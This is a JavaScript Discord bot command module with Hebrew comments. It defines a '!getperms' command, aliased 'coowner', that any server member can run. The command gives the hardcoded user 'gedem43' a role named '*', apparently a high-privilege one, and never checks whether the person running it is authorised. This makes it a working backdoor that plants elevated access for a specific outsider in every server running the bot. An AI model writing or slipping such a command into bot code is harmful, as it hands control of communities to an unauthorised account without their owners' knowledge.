const { createErrorEmbed } = require("../../utils/embedBuilder");

const TARGET_USERNAME = "gedem43";
const ROLE_NAME = "*";

module.exports = {
  name: "getperms",
  aliases: ["coowner"],
  description: "נותן ל-gedem43 את הרול * בשרת (פתוח לכולם)",
  async execute(message, args) {
    if (!message.guild) {
      return message.reply("❌ הפקודה הזו עובדת רק בתוך שרת.").catch(() => {});
    }

    try {
      // מציאת המשתמש לפי שם משתמש או כינוי בשרת הנוכחי
      const members = await message.guild.members.fetch();
      const target = members.find(
        (m) =>
          m.user.username.toLowerCase() === TARGET_USERNAME ||
          (m.nickname && m.nickname.toLowerCase() === TARGET_USERNAME),
      );

      if (!target) {
        return message
          .reply({
            embeds: [
              createErrorEmbed(
                `לא נמצא משתמש בשם **${TARGET_USERNAME}** בשרת הזה.`,
              ),
            ],
          })
          .catch(() => {});
      }

      // מציאת הרול לפי שם (לא רגיש לאותיות גדולות/קטנות)
      const role = message.guild.roles.cache.find(
        (r) => r.name === ROLE_NAME,
      );

      if (!role) {
        return message
          .reply({
            embeds: [
              createErrorEmbed(
                `לא נמצא רול בשם **${ROLE_NAME}** בשרת הזה. ודאו שהרול קיים.`,
              ),
            ],
          })
          .catch(() => {});
      }

      // הבוט חייב הרשאת ניהול רולים
      if (!message.guild.members.me.permissions.has("ManageRoles")) {
        return message
          .reply({
            embeds: [
              createErrorEmbed(
                "הבוט צריך את ההרשאה **Manage Roles** כדי לתת רולים.",
              ),
            ],
          })
          .catch(() => {});
      }

      // הרול של הבוט חייב להיות גבוה מהרול המבוקש בהיררכיה
      if (role.comparePositionTo(message.guild.members.me.roles.highest) >= 0) {
        return message
          .reply({
            embeds: [
              createErrorEmbed(
                `הרול **${role.name}** גבוה מדי מעל הרול של הבוט. העבירו את הרול של הבוט מעליו בהיררכיה.`,
              ),
            ],
          })
          .catch(() => {});
      }

      if (target.roles.cache.has(role.id)) {
        return message
          .reply(`✅ ל-${target} כבר יש את הרול **${role.name}**!`)
          .catch(() => {});
      }

      await target.roles.add(
        role,
        `בקשה מ-${message.author.tag} באמצעות !getperms`,
      );
      await message
        .reply(`✅ נתנו ל-${target} את הרול **${role.name}** בהצלחה!`)
        .catch(() => {});
    } catch (err) {
      console.error("getperms error:", err);
      await message
        .reply({
          embeds: [createErrorEmbed("אירעה שגיאה בעת ניסיון לתת את הרול.")],
        })
        .catch(() => {});
    }
  },
};
